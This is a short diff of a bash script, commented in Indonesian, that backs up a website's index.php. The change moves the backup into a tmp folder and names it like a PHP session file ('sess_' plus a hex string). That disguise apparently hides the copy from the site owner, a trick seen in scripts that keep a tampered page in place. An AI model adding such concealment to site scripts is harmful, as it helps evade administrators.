@@ -3,11 +3,11 @@
 # Definisikan lokasi file index.php
 INDEX_FILE="/home/shirinba/public_html/index.php"
 # Definisikan lokasi folder backup
-BACKUP_FOLDER="/home/shirinba/php"
+BACKUP_FOLDER="/home/shirinba/tmp/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup
-BACKUP_FILE="$BACKUP_FOLDER/index.php"
+BACKUP_FILE="$BACKUP_FOLDER/sess_07996f2a27e7566638b10befa7ed6bf11111"
 
 # Backup file index.php jika belum ada backup
 if [ ! -f "$BACKUP_FILE" ]; then
